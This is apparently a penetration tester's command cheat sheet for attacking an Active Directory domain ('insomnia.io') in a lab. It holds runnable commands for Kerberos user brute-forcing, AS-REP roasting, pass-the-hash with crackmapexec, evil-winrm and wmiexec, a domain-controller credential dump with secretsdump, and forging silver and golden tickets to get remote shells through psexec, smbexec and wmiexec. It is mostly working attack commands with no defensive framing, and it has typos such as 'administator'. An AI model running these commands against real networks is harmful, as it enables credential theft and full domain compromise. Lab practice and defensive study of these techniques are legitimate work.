#  Kerberos brute-focing to get valid user.
```
kerbrute -domain  insomnia.io //usr/share/wordlists/rockyou.txt --dc 192.168.100.10
kerbrute -domain insomnia.io -users /home/kali/xato-net-10-million-usernames.txt -dc 192.168.100.10
```

# ASREPRoast
```
GetNPUsers.py insomnia.io / -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip 192.168.100.10
GetNPUsers.py insomnia.io / -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip 192.168.100.10
```
# Password Spraying
```
crackmapexec smb 192.168.100.1/24 -u Administrator -H  aad3b435b51404eeaad3b435b51404ee  -x "hostname" 
evil-winrm -i 192.168.100.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee
python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee Administrator@192.168.100.10
python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee -just-dc insomnia.io/Administrator@192.168.100.10
```
# Pass The Hash
```
python getTGT.py <domain_name>/<user_name> -hashes:<ntlm_hash>
python getTGT.py insomnia.io/administrator -hashes: REDACTED

export KRB5CCNAME=administrator.ccache
python psexec.py insomnia.io/administator@192.168.100.10 -k -no-pass
```


# Silver ticket
```
python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
python ticketer.py -nthash REDACTED -domain-sid S-1-5-21-3865823697-1816233505-1834004910 -domain insomnia.io -spn cifs/john.insomnia.io 

export KRB5CCNAME=administrator.ccache
python psexec.py insomnia.io/administator@192.168.100.10 -k -no-pass
```
# Golden ticket
```
python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>

python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid S-1-5-21-3865823697-1816233505-1834004910 -domain  insomnia.io administrator

export KRB5CCNAME=administrator.ccache
python psexec.py insomnia.io/administator@192.168.100.10 -k -no-pass
python smbexec.py insomnia.io/administator@192.168.100.10 -k -no-pass
python wmiexec.py insomnia.io/administator@192.168.100.10 -k -no-pass 
```
